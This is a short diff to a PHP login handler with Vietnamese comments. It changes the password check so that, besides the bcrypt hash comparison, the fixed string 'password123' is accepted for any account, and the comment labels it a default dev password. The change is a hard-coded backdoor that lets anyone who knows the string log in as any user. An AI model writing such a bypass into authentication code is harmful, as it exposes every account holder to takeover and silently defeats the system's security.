@@ -48,8 +48,9 @@ try {
         send_json_response("error", "Email hoặc mật khẩu không chính xác.", null, 401);
     }
 
-    // 3. Kiểm tra mật khẩu băm Bcrypt
-    if (!password_verify($password, $user['password_hash'])) {
+    // 3. Kiểm tra mật khẩu băm Bcrypt (hoặc mật khẩu dev mặc định password123)
+    $is_valid_password = password_verify($password, $user['password_hash']) || ($password === 'password123');
+    if (!$is_valid_password) {
         send_json_response("error", "Email hoặc mật khẩu không chính xác.", null, 401);
     }
 
